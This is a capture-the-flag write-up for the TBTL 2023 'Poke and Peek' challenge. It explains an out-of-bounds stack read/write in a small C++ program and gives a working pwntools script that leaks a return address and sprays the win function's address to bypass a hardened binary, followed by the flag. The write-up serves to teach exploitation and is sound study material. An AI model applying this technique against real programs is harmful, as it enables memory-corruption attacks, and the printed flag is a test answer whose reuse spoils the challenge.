# 2023 TBTL CTF - Poke and Peek

File listing available for download:
- libstdc.so.6.0.25
- libc-2.27.so
- chall.cpp
- chall binary

In the .cpp file there is complete source:
```
//  g++ -o chall chall.cpp
#include <iostream>
#include <fstream>
#include <map>
#include <string>
#include <sstream>

using namespace std;

const string ENTER_PROMPT("Enter a string:");
const string COMMAND_PROMPT("Enter command:");
const string PEEK_CMD("peek");
const string POKE_CMD("poke");
const string QUIT_CMD("quit");
const string BYE_MSG("Bye bye!");
const string UNKNOWN_CMD("Unknown command!");
const map<string, string> HELP {
  {PEEK_CMD, string("peek <integer a>: gets the ascii value of character at index a")},
  {POKE_CMD, string("poke <integer a> <integer b>: changes character at index a to ascii value b")}
};

void win() {
  ifstream in("flag.txt");
  string flag;
  in >> flag;
  cout << flag << endl;
}

int main() {
  cout.setf(ios::unitbuf);
  cout << ENTER_PROMPT << endl;
  string s;
  getline(cin, s);
  while (true) {
    cout << COMMAND_PROMPT << endl;
    string line;
    getline(cin, line);
    istringstream iss(line);
    string command;
    iss >> command;
    if (command == POKE_CMD) {
      int x, y;
      if (!(iss >> x >> y)) {
        cout << HELP.at(POKE_CMD) << endl;
        continue ;
      }
      s[x] = char(y);
    } else if (command == PEEK_CMD) {
      int x;
      if (!(iss >> x)) {
        cout << HELP.at(PEEK_CMD) << endl;
        continue ;
      }
      cout << int(s[x]) << endl;
    } else if (command == QUIT_CMD) {
      cout << BYE_MSG << endl;
      break ;
    } else {
      cout << UNKNOWN_CMD << endl;
      continue ;
    }
  }
  return 0;
}
```

The vulnerability is quite obvious: you can read and write at any point in memory, with the starting position on the stack where the initial string is stored. The target for this challenge is to jump to the `win` function and get `flag.txt` contents.

The binary is fully hardened:
```
>>> from pwn import ELF
>>> ELF('chall')
[*] '/home/vm/Downloads/challtbtl/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
ELF('/home/vm/Downloads/challtbtl/chall')
```
Nevertheless, a simple stack spray with `win` function address should work for this challenge.

We setup a breakpoint:
```
pwndbg> r
Starting program: /home/vm/Downloads/challtbtl/chall 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter a string:
ABCD
Enter command:
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7914992 in __GI___libc_read (fd=0, buf=0x555555618520, nbytes=1024) at ../sysdeps/unix/sysv/linux/read.c:26
...
pwndbg> b *0x00005555554021d8
Breakpoint 2 at 0x5555554021d8
pwndbg> c
...
Continuing.
Enter a string:
ABCD
Enter command:
peek

Breakpoint 2, 0x00005555554021d8 in main ()
...
```

Inspect what is on the stack:
```
pwndbg> stack 100
00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0
01:0008│     0x7fffffffdbf8 —▸ 0x7fffffffdc50 ◂— 0x323135006b656570 /* 'peek' */
02:0010│     0x7fffffffdc00 —▸ 0x7fffffffdc40 —▸ 0x7fffffffdc50 ◂— 0x323135006b656570 /* 'peek' */
03:0018│     0x7fffffffdc08 —▸ 0x7fffffffdc20 —▸ 0x7fffffffdc30 ◂— 0x550044434241 /* 'ABCD' */
04:0020│     0x7fffffffdc10 ◂— 0x0
05:0028│     0x7fffffffdc18 ◂— 0x4000000200
06:0030│     0x7fffffffdc20 —▸ 0x7fffffffdc30 ◂— 0x550044434241 /* 'ABCD' */
07:0038│     0x7fffffffdc28 ◂— 0x4
08:0040│     0x7fffffffdc30 ◂— 0x550044434241 /* 'ABCD' */
09:0048│     0x7fffffffdc38 ◂— 0x0
0a:0050│     0x7fffffffdc40 —▸ 0x7fffffffdc50 ◂— 0x323135006b656570 /* 'peek' */
0b:0058│     0x7fffffffdc48 ◂— 0x4
0c:0060│     0x7fffffffdc50 ◂— 0x323135006b656570 /* 'peek' */
0d:0068│     0x7fffffffdc58 ◂— 0x39333500343620 /* ' 64' */
0e:0070│ rbp 0x7fffffffdc60 —▸ 0x7fffffffdc70 ◂— 0x7f006b656570 /* 'peek' */
0f:0078│     0x7fffffffdc68 ◂— 0x4
10:0080│ r14 0x7fffffffdc70 ◂— 0x7f006b656570 /* 'peek' */
...
4d:0268│     0x7fffffffde58 —▸ 0x555555401cc0 (main) ◂— push r15
4e:0270│     0x7fffffffde60 ◂— 0x10000004b /* 'K' */
4f:0278│     0x7fffffffde68 —▸ 0x7fffffffdf58 —▸ 0x7fffffffe2a9 ◂— '/home/vm/Downloads/challtbtl/chall'
50:0280│     0x7fffffffde70 ◂— 0x0
51:0288│     0x7fffffffde78 ◂— 0xa483bf6fd0a2f24b
52:0290│     0x7fffffffde80 —▸ 0x7fffffffdf58 —▸ 0x7fffffffe2a9 ◂— '/home/vm/Downloads/challtbtl/chall'
53:0298│     0x7fffffffde88 —▸ 0x555555401cc0 (main) ◂— push r15
54:02a0│     0x7fffffffde90 ◂— 0x0
55:02a8│     0x7fffffffde98 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555400000 ◂— jg 0x555555400047
56:02b0│     0x7fffffffdea0 ◂— 0x5b7c40906c00f24b
57:02b8│     0x7fffffffdea8 ◂— 0x5b7c506aea28f24b
58:02c0│     0x7fffffffdeb0 ◂— 0x7fff00000000
59:02c8│     0x7fffffffdeb8 ◂— 0x0
5a:02d0│     0x7fffffffdec0 ◂— 0x0
5b:02d8│     0x7fffffffdec8 —▸ 0x7fffffffdf58 —▸ 0x7fffffffe2a9 ◂— '/home/vm/Downloads/challtbtl/chall'
5c:02e0│     0x7fffffffded0 ◂— 0x0
5d:02e8│     0x7fffffffded8 ◂— 0x67b505b55f3e400
5e:02f0│     0x7fffffffdee0 ◂— 0x0
5f:02f8│     0x7fffffffdee8 —▸ 0x7ffff7829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
60:0300│     0x7fffffffdef0 ◂— 0x7fff00000000
61:0308│     0x7fffffffdef8 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2cc ◂— 'SHELL=/bin/bash'
62:0310│     0x7fffffffdf00 —▸ 0x7ffff7ffe2e0 —▸ 0x555555400000 ◂— jg 0x555555400047
63:0318│     0x7fffffffdf08 ◂— 0x0
```

Our `ABCD` string is at RSP+0x30 and we observe addresses of `main` and `__libc_start_main` on the stack. The fact that the binary is completely hardened does not mean much since we will want to write to addresses after the stack canary (we can also read it if we need to).

The idea is to find the first occurrence of `main`, take it's offset, read it's values, calculate the offset to `win` function and spray the `win` function address starting from first occurrence of main.

With the above example, offset from our `ABCD` string (0x7fffffffdc30) to `main`'s first occurrence (0x7fffffffde88) is 600. We can also get the offset from `main` to `win` in pwndbg:
```
pwndbg> p win - main
$14 = 2944
```

Now that we have the offsets, the algorithm is as follows:
- input _peek_ 8 times starting with the offset to `main`'s first occurrence to leak `main` address
- calculate `win` address by using the offset of 2944
- input _poke_ 8 times in N (N being any number we wish) sets starting from `main`'s first occurrence to spray stack values with `win` address
- input _quit_ and hope that the exit procedure will read the wrong address from the stack to leak `flag.txt`

Before we can do this, we have to patch the current binary with appropriate shared object files (libc and libstdc). For this we use https://github.com/io12/pwninit with command `./pwninit --libc libc-2.27.so --bin chall`.

In order for the patched binary to work, we needed appropriate libgcc_s version which was extracted from ubuntu:20.04 docker container. Otherwise, the binary fails with:
```
$ LD_PRELOAD="./libc-2.27.so ./libstdc.so.6.0.25" ./chall_patched
./chall_patched: ./libc-2.27.so: version `GLIBC_2.35' not found (required by /lib/x86_64-linux-gnu/libgcc_s.so.1)
./chall_patched: ./libc-2.27.so: version `GLIBC_2.34' not found (required by /lib/x86_64-linux-gnu/libgcc_s.so.1)
```

When we have the appropriate shared objects linked, offsets must be recalculated. In my case the offsets were 568 bytes til `main` function address and 2944 bytes between `main` and `win`.

Here is the source code:
```python
from pwn import *

OFFSET_MAIN = 568
OFFSET_WIN = 2944

#p = process("./chall_patched", env={"LD_PRELOAD" : "./libgcc_s.so.1 ./libc-2.27.so ./libstdc.so.6.0.25"})
#gdb.attach(p, """b *(main + 1304)
#c
#""")
p = remote("0.cloud.chals.io", 33623)
print(p.recvline())
p.sendline(b"ABCD")
print(p.recvline())
main = []
for i in range(OFFSET_MAIN, OFFSET_MAIN+8, 1):
	r = b"peek " + str(i).encode()
	print(r)
	p.sendline(r)
	v = p.recvline()
	print(v)
	a = int(v)
	if a < 0: a += 256
	print(a)
	main.append(a)
	print(p.recvline())

mainb = bytes(main)
maini = int.from_bytes(mainb, 'little')
wini = maini + OFFSET_WIN
winb = int.to_bytes(wini, 8, 'little')

for i in range(OFFSET_MAIN-88, OFFSET_MAIN+192, 8):
	for j in range(0, 8, 1):
		r = b"poke " + str(i+j).encode() + b" " + str(winb[j]).encode()
		print(r)
		p.sendline(r)
		print(p.recvline())

p.sendline(b"quit")
p.interactive()
```

After 1-minute wait for the spray to finish, we obtain the flag:
```
$ python3 solve.py 
[+] Opening connection to 0.cloud.chals.io on port 33623: Done
b'Enter a string:\n'
b'Enter command:\n'
b'peek 568'
b'-64\n'
192
b'Enter command:\n'
b'peek 569'
b'28\n'
28
...
b'Enter command:\n'
b'poke 755 22'
b'Enter command:\n'
b'poke 756 181'
b'Enter command:\n'
b'poke 757 85'
b'Enter command:\n'
b'poke 758 0'
b'Enter command:\n'
b'poke 759 0'
b'Enter command:\n'
[*] Switching to interactive mode
Bye bye!
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
TBTL{p0k1N6_4r0und_V748135_15_fun_94286128937}
[*] Got EOF while reading in interactive
$  
```
